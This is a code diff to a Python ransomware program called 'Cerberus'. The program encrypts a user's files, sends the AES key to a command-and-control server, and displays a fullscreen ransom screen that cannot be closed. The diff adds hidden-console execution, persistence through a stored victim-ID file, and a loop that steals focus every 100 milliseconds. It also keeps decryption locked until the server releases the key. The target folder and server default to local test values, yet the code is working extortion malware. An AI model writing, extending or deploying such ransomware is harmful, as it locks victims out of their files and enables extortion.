@@ -1,9 +1,11 @@
 # ransomware.py
 import os
+import sys
 import base64
 import json
 import threading
 import time
+import ctypes
 from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage
 from tkinter import font as tkfont
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -23,6 +25,7 @@ FQIDAQAB
 C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
 TARGET_DIRECTORY = os.path.join(os.path.expanduser("~"), "test_data")
 LOCK_FILE = os.path.join(TARGET_DIRECTORY, ".cerberus_lock")
+ID_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_id.txt") # PERSISTENCE: Store ID here
 LOG_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_log.txt")
 ENCRYPTED_EXTENSION = ".cerberus"
 
@@ -38,6 +41,19 @@ TARGET_EXTENSIONS = {
 LOGO_BASE64 = """
 iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
 """
+
+# --- System Lockdown Utilities ---
+def hide_console():
+    """Hides the console window on Windows."""
+    if os.name == 'nt':
+        try:
+            kernel32 = ctypes.WinDLL('kernel32')
+            user32 = ctypes.WinDLL('user32')
+            hWnd = kernel32.GetConsoleWindow()
+            if hWnd:
+                user32.ShowWindow(hWnd, 0) # SW_HIDE = 0
+        except Exception as e:
+            log_error(f"Failed to hide console: {e}")
 
 # --- Cryptography ---
 def generate_aes_key():
@@ -101,10 +117,10 @@ def encrypt_directory():
         os.makedirs(TARGET_DIRECTORY)
         log_error(f"Created target directory: {TARGET_DIRECTORY}")
 
-    # Prevent re-encryption
+    # Persistence check happens in main now, but double check lock file
     if os.path.exists(LOCK_FILE):
-        log_error("Encryption already performed. Skipping.")
-        return
+        log_error("Encryption already performed. Skipping encryption phase.")
+        return None
 
     aes_key = generate_aes_key()
     encrypted_files = 0
@@ -142,6 +158,11 @@ def check_in_with_c2(aes_key):
         response = requests.post(f"{C2_SERVER_URL}/api/checkin", json=payload, timeout=10)
         response.raise_for_status()
         victim_id = response.json()['victim_id']
+        
+        # PERSISTENCE: Save Victim ID
+        with open(ID_FILE, 'w') as f:
+            f.write(victim_id)
+            
         log_error(f"Successfully checked in. Victim ID: {victim_id}")
         return victim_id
     except Exception as e:
@@ -160,9 +181,12 @@ class RansomwareGUI:
         master.attributes('-fullscreen', True)  # Fullscreen
         master.attributes('-topmost', True)  # Always on top
         master.configure(bg='#0a0a0a')
+        
+        # Aggressive Focus Grabbing
         master.bind('<FocusOut>', self.refocus) # Prevent losing focus
         master.bind('<Escape>', lambda e: None) # Disable Escape key
         master.protocol("WM_DELETE_WINDOW", self.disable_event) # Disable close button
+        self.force_focus_loop() # Start persistent focus loop
 
         # GUI Elements
         try:
@@ -182,8 +206,7 @@ class RansomwareGUI:
 
         Label(main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", font=title_font, fg='#ff4d4d', bg='#0a0a0a').pack(pady=10)
         Label(main_frame, text="Your documents, photos, and other important files have been locked.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=600).pack(pady=5)
-        Label(main_frame, text="To get your files back, you must wait for your unique decryption key.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=600).pack(pady=5)
-
+        
         Label(main_frame, text=f"YOUR VICTIM ID IS:", font=body_font, fg='#ffffff', bg='#0a0a0a').pack(pady=(20, 5))
         self.victim_id_label = Label(main_frame, text=self.victim_id, font=tkfont.Font(family="Courier", size=16, weight="bold"), fg='#4dff88', bg='#0a0a0a')
         self.victim_id_label.pack()
@@ -191,7 +214,7 @@ class RansomwareGUI:
         self.status_label = Label(main_frame, text="STATUS: Awaiting payment confirmation...", font=body_font, fg='#ffff4d', bg='#0a0a0a')
         self.status_label.pack(pady=(20, 5))
 
-        Label(main_frame, text="Once your key is ready, it will appear below automatically.", font=body_font, fg='#cccccc', bg='#0a0a0a').pack(pady=5)
+        Label(main_frame, text="Payment detected automatically. Do not close this window.", font=body_font, fg='#cccccc', bg='#0a0a0a').pack(pady=5)
         
         self.key_var = StringVar()
         self.key_entry = Entry(main_frame, textvariable=self.key_var, font=tkfont.Font(family="Courier", size=12), show="*", width=64, bg='#2a2a2a', fg='#ffffff', insertbackground='white')
@@ -200,6 +223,7 @@ class RansomwareGUI:
 
         self.decrypt_button = Button(main_frame, text="DECRYPT FILES", font=tkfont.Font(family="Helvetica", size=14, weight="bold"), command=self.start_decryption, bg='#ff4d4d', fg='white', activebackground='#cc0000', activeforeground='white')
         self.decrypt_button.pack(pady=20)
+        self.decrypt_button.config(state='disabled') # Disabled until key arrives
 
         # Start the heartbeat thread
         self.heartbeat_thread_running = True
@@ -208,6 +232,12 @@ class RansomwareGUI:
 
     def refocus(self, event=None):
         self.master.focus_force()
+    
+    def force_focus_loop(self):
+        """Aggressively brings window to front every 100ms"""
+        self.master.lift()
+        self.master.focus_force()
+        self.master.after(100, self.force_focus_loop)
 
     def disable_event(self):
         pass
@@ -219,27 +249,25 @@ class RansomwareGUI:
                 if response.status_code == 200:
                     data = response.json()
                     if data.get("status") == "ready":
-                        self.key_url = data.get("key_url")
-                        key_response = requests.get(self.key_url, timeout=5)
-                        if key_response.status_code == 200:
-                            key = key_response.text.strip()
+                        # UPDATED: Get key directly from JSON
+                        key = data.get("key")
+                        if key:
                             self.master.after(0, self.update_key_field, key)
                             self.heartbeat_thread_running = False
             except Exception as e:
                 log_error(f"Heartbeat error: {e}")
-            time.sleep(30) # Poll every 30 seconds
+            time.sleep(10) # Poll more frequently (10s) for better UX
 
     def update_key_field(self, key):
         self.key_var.set(key)
         self.key_entry.config(state='normal')
-        self.status_label.config(text="STATUS: Decryption key received. You may now decrypt your files.", fg='#4dff88')
+        self.status_label.config(text="STATUS: Valid key received. Decryption enabled.", fg='#4dff88')
         self.decrypt_button.config(state='normal')
         self.key_entry.config(state='readonly')
 
     def start_decryption(self):
         key_b64 = self.key_var.get()
         if not key_b64:
-            self.status_label.config(text="ERROR: No key provided.", fg='red')
             return
         try:
             key = base64.b64decode(key_b64)
@@ -251,64 +279,55 @@ class RansomwareGUI:
                         if decrypt_file_aes_gcm(file_path, key):
                             decrypted_files += 1
             
-            # Clean up lock file
-            if os.path.exists(LOCK_FILE):
-                os.remove(LOCK_FILE)
+            # Clean up persistence files
+            if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
+            if os.path.exists(ID_FILE): os.remove(ID_FILE)
             
-            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted. You can now close this window.", fg='#4dff88')
+            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted.", fg='#4dff88')
             self.heartbeat_thread_running = False
             self.decrypt_button.config(state='disabled')
-            # Allow closing after successful decryption
+            
+            # Allow closing
             self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
             self.master.bind('<Escape>', lambda e: self.master.destroy())
+            
+            # Stop the aggressive focus loop (tricky in Tkinter to cancel 'after', 
+            # but destroying window will stop it)
 
         except Exception as e:
             log_error(f"Decryption failed: {e}")
-            self.status_label.config(text="ERROR: Decryption failed. Invalid key?", fg='red')
+            self.status_label.config(text="ERROR: Decryption failed.", fg='red')
 
 # --- Main Execution ---
 if __name__ == "__main__":
-    # Step 1: Encrypt files and get the key
+    # Hide console immediately
+    hide_console()
+
+    # PERSISTENCE CHECK: Do we already have an ID?
+    if os.path.exists(ID_FILE):
+        try:
+            with open(ID_FILE, 'r') as f:
+                victim_id = f.read().strip()
+            if victim_id:
+                log_error(f"Resuming session for Victim ID: {victim_id}")
+                root = Tk()
+                app = RansomwareGUI(root, victim_id)
+                root.mainloop()
+                sys.exit()
+        except Exception as e:
+            log_error(f"Failed to read persistence file: {e}")
+            # Fall through to new infection if file is corrupt
+
+    # NEW INFECTION
     aes_key = encrypt_directory()
-    if not aes_key:
-        # If encryption was already done, we need to retrieve the victim ID
-        # In a real scenario, this ID might be stored in a file.
-        # For this simulation, if the lock file exists, we assume we need to check in again
-        # to get the ID, or we can't proceed. Let's try to get the ID.
-        log_error("Encryption already done. Checking for victim ID to launch GUI.")
-        # This part is tricky. Without a stored ID, we can't poll.
-        # For this demo, we will just exit if the lock file exists and we can't get an ID.
-        # A more advanced version would store the ID in a hidden file.
-        if os.path.exists(LOCK_FILE):
-            log_error("Cannot proceed without Victim ID. Exiting.")
-            # To make it re-runnable for testing, you could comment out the exit and
-            # have it generate a new key and check in again, but that's not realistic.
-            # For now, we'll just show an error and exit.
-            # Create a simple error window
+    
+    if aes_key:
+        victim_id = check_in_with_c2(aes_key)
+        if victim_id:
             root = Tk()
-            root.withdraw()
-            import tkinter.messagebox as messagebox
-            messagebox.showerror("Cerberus", "System already locked. Cannot re-run payload.")
-            exit()
+            app = RansomwareGUI(root, victim_id)
+            root.mainloop()
         else:
-            # This case should not happen, but as a fallback
-            log_error("Unknown error. Exiting.")
-            exit()
-
-    # Step 2: Check in with the C2 server to get the Victim ID
-    victim_id = check_in_with_c2(aes_key)
-    if not victim_id:
-        log_error("FATAL: Could not connect to C2 server. Cannot continue.")
-        # Create a simple error window
-        root = Tk()
-        root.withdraw()
-        import tkinter.messagebox as messagebox
-        messagebox.showerror("Cerberus", "Network error. Could not connect to activation server.")
-        exit()
-
-    # Step 3: Launch the persistent GUI
-    root = Tk()
-    app = RansomwareGUI(root, victim_id)
-    root.mainloop()
-
-    log_error("GUI closed. Exiting.")
+            log_error("Failed to get Victim ID. Aborting GUI.")
+    else:
+        log_error("Encryption skipped or failed. Aborting.")
